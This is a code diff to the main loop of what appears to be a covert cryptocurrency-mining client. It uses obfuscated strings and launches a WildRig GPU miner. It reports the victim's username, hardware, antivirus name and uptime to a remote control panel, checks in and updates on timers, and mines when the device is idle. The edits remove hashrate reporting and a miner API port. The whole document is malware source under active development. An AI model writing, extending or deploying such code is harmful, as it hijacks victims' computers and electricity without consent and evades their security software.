@@ -430,7 +430,7 @@ int main(int argc, char *argv[])
     const std::string WILDRIG_PASS     = OBFUSCATE_STRING(" --pass ");
     const std::string WILDRIG_WORKER   = OBFUSCATE_STRING(" --worker ");
     const std::string WILDRIG_FAN      = OBFUSCATE_STRING(" --gpu-fan-speed ");
-    const std::string WILDRIG_API      = OBFUSCATE_STRING(" --api-port 21550 --no-color");
+    const std::string WILDRIG_FLAGS    = OBFUSCATE_STRING(" --no-color");
 
     // WildRig accepts the panel algo names directly (kawpow, progpowz, pearlhash, ...).
     auto getAlgoMapping = [](const std::string& algo) -> std::string {
@@ -449,7 +449,7 @@ int main(int argc, char *argv[])
         if (cfg.fan_speed > 0 && IsRunningAsAdmin()) {
             args += WILDRIG_FAN + std::to_string(cfg.fan_speed);
         }
-        args += WILDRIG_API;
+        args += WILDRIG_FLAGS;
         return args;
     };
 
@@ -507,7 +507,7 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Fetching configuration from panel..." << std::endl;
 #endif
-        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
+        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, GetSystemUptimeMinutes())) {
             std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
             return 1;
         }
@@ -826,7 +826,6 @@ int main(int argc, char *argv[])
     int checkInCounter = 0;
     int updateCheckCounter = 0;
     int idlePrintCounter = 0;
-    int hashratePrintCounter = 0;
     const int CHECK_IN_INTERVAL    = 15;  // seconds (4 minutes)
     const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)
     bool panelOnline = true; // we reached the panel successfully to get here
@@ -845,25 +844,12 @@ int main(int argc, char *argv[])
         if (checkInCounter >= CHECK_IN_INTERVAL)
         {
             checkInCounter = 0;
-            double cpuHashrate = 0.0;
-            double gpuHashrate = 0.0;
-            std::string gpuHashrateUnit = "H/s";
-
-            if (cpuPid != 0 && IsPidRunning(cpuPid)) {
-                cpuHashrate = GetMinerHashrate();
-            }
-            if (gpuPid != 0 && IsPidRunning(gpuPid)) {
-                auto [val, unit] = GetGPUMinerHashrate();
-                gpuHashrate = val;
-                gpuHashrateUnit = unit;
-            }
-
             {
                 bool configFetched = false;
                 if (!configGetUrlStr.empty()) {
                     configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                 } else {
-                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
+                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, GetSystemUptimeMinutes());
                 }
 
                 if (!configFetched && panelOnline) {
@@ -1064,12 +1050,6 @@ int main(int argc, char *argv[])
         if (cpuPid != 0) {
             // Check idle status continuously (not just on crash)
             bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
-
-            hashratePrintCounter++;
-            if (hashratePrintCounter >= 30) {
-                hashratePrintCounter = 0;
-                std::cout << "[*] CPU hashrate: " << GetMinerHashrate() << " H/s" << std::endl;
-            }
 
             idlePrintCounter++;
             if (idlePrintCounter >= 60) {
